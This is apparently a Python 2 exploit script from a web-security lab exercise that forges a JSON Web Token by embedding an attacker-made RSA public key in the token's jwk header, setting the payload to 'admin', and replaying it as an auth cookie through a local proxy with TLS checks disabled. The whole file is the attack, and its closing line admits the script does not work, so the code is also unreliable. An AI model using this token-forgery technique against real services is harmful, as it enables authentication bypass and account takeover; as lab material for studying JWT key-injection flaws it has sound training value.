import requests
import base64
from Crypto.PublicKey import RSA

fp = open('private.der','rb')
private_key = RSA.importKey(fp.read())
public_key = private_key.publickey()
fp.close()
n = base64.urlsafe_b64encode(str(public_key.n)).replace('=','')
e = base64.urlsafe_b64encode(str(public_key.e)).replace('=','')

proxies = {'http': 'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080'}

url = "https://ptl-2f8026f0-bc9c0875.libcurl.so/"

def login(url, data):
    response = requests.post(url = url,data=data, allow_redirects=False, proxies=proxies, verify=False)
    cookie = response.headers['Set-Cookie']
    return cookie, response.text

username = "test"
password = "test"
data = {'username':username, 'password':password}
cookie,_ = login(url+'login',data)

jwt_enc = cookie.split("=")[1].split(";")[0]
header_enc,payload_enc,signature_enc = jwt_enc.split('.')

#header, payload, signature = [base64.b64decode(x + '='*(-len(x) % 4) ) for x in jwt_enc.split('.')]

header = base64.b64decode(header_enc+'==')
payload = base64.b64decode(payload_enc+'==')
signature = base64.b64decode(signature_enc)
#print "old",header,payload, signature

header = '{"alg":"RS256","jwk":{"kty":"RSA","kid":"mrseccoder","use":"sig","n":"'+n+'","e":"'+e+'"}}'
payload = 'admin'

#print "new",header,payload

header_payload_enc = '.'.join([base64.urlsafe_b64encode(x).replace('=','') for x in [header,payload]])

signature = private_key.sign("SHA256",header_payload_enc)

token = header_payload_enc+'.'+base64.urlsafe_b64encode(str(signature[0])).replace('=','')

print "token:",token
cookie = "auth="+token
headers = {"Cookie": cookie}
response = requests.get(url, headers = headers, proxies = proxies, verify=False)
print response.text,response.status_code,response.reason


jwt_enc = cookie.split("=")[1]
header_enc,payload_enc,signature_enc = jwt_enc.split('.')
header = base64.b64decode(header_enc+'==')
payload = base64.b64decode(payload_enc+'==')
signature = base64.b64decode(signature_enc+'==')
#print "new:",header,payload, signature

print "Don't know the damn reason why its not working! debug it later. But ruby version of it is woking. check it out"
